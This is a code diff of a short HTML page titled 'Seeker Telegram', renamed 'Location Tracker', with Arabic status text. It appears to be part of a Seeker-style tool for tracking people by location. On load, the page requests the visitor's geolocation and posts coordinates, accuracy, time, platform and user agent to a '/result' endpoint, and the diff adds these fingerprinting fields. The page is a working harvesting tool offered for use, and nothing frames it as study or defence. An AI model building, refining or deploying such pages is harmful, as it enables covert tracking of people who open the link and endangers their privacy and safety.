@@ -1,26 +1,38 @@
 <!DOCTYPE html>
-<html lang="ar">
+<html>
 <head>
-  <meta charset="UTF-8"><title>Seeker Telegram</title></head>
-<body>
-  <h2>🔍 جاري تحديد موقعك...</h2>
+  <title>Location Tracker</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <script>
-    navigator.geolocation.getCurrentPosition(position => {
-      fetch("/location", {
-        method: "POST",
-        headers: {"Content-Type":"application/json"},
-        body: JSON.stringify({
-          latitude: position.coords.latitude,
-          longitude: position.coords.longitude
-        })
-      }).then(() => {
-        document.body.innerHTML = "<h2>✅ تم إرسال موقعك!</h2>";
-      }).catch(() => {
-        document.body.innerHTML = "<h2>❌ فشل الإرسال</h2>";
-      });
-    }, error => {
-      document.body.innerHTML = "<h2>❗ تم رفض إذن الموقع</h2>";
-    });
+    window.onload = function() {
+      if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(success, error);
+      }
+
+      function success(position) {
+        fetch('/result', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({
+            lat: position.coords.latitude,
+            lon: position.coords.longitude,
+            accuracy: position.coords.accuracy,
+            timestamp: new Date().toLocaleString(),
+            battery: 80, // ممكن تستخدم JS للحصول على النسبة الفعلية
+            os: navigator.platform,
+            browser: navigator.userAgent
+          })
+        });
+        document.body.innerHTML = "<h2>✅ تم إرسال الموقع بنجاح</h2>";
+      }
+
+      function error(err) {
+        document.body.innerHTML = "<h2>❌ لم نتمكن من الحصول على الموقع</h2>";
+      }
+    };
   </script>
+</head>
+<body>
+  <h2>📍 جاري تحديد الموقع...</h2>
 </body>
 </html>
